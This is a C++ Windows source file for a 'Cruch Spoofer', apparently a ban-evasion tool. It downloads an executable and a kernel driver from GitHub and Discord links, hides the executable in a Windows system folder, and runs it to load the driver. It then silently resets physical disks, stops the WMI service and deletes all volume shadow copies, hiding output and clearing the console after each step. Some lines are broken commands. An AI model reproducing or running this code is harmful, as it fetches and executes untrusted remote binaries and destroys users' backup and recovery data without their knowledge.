#include <iostream>


#include <Windows.h>
#include <ios>
#include <limits>
#include <stdio.h>
#include <time.h>
#include <conio.h>
#include <sstream>
#include <string>
#include <urlmon.h>
#include <tchar.h>
#include <iostream>
//#include "CConsole.h"
#include "CConsole.cpp"
#include <stdio.h>
#include <string>
#include <Windows.h>
#include <tchar.h>
#include <Wininet.h>
#include <filesystem>
#include <iostream>
#include <stdexcept>
#include <string>
#include <iostream>
#include <windows.h> 
#include <iostream>
#include <fstream>
#include <string>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")


//made by Cruch-Shadow
//  https://discord.gg/BfqtytXhpB

using namespace std;

void spoofdownload()
{

    HRESULT a = URLDownloadToFile(NULL, _T("https://github.com/shadypro4/Spoofer/raw/main/mapper_3.exe"), _T("C:/Windows/IME/mapper_3.exe"), 0, NULL);
    HRESULT ab = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/988487140222595072/993721376319995975/driver1.sys"), _T("driver1.sys"), 0, NULL);
    CConsole::Clear();

}

int main()
{

    SetConsoleTitle(_T("Cruch Spoofer"));



    std::fstream myfile;
    std::string line;
    ofstream outFile;





    outFile.open("Cruch spoofer made by cruch team");
    outFile << "Cruch spoofer made by cruch team!\n" << endl;
    outFile.close();

    system("Spoofe");
    Sleep(3000);
    outFile.open("perm unbanned");
    outFile << "Spoofing..." << endl;
    outFile.close();
    system("TASKKILL /F /IM notepad.exe 1>NULL");

    system("perm unbanned done");


    system("powershell.exe  Reset-PhysicalDisk * >nul 2>&1");
    CConsole::Clear();
    system("start C:/Windows/IME/mapper_3.exe driver1.sys");
    CConsole::Clear();
    system("NETSH WINSOCK RESET");
    CConsole::Clear();
    system("NETSH INT IP RESET");
    CConsole::Clear();
    system("NETSH INTERFACE IPV4 RESET");
    CConsole::Clear();
    system("NETSH INTERFACE IPV6 RESET");
    CConsole::Clear();
    system("NETSH INTERFACE TCP RESET");
    CConsole::Clear();
    system("IPCONFIG /RELEASE");
    CConsole::Clear();
    system("IPCONFIG /RELEASE");
    CConsole::Clear();
    system("IPCONFIG /RENEW");
    CConsole::Clear();
    system("IPCONFIG /FLUSHDNS");
    CConsole::Clear();
    system("IPCONFIG /RENEW");
    CConsole::Clear();
    system("net stop winmgmt /y >nul 2>&1");
    CConsole::Clear();
    system("vssadmin delete shadows /All /Quiet >nul 2>&1");
    CConsole::Clear();

}

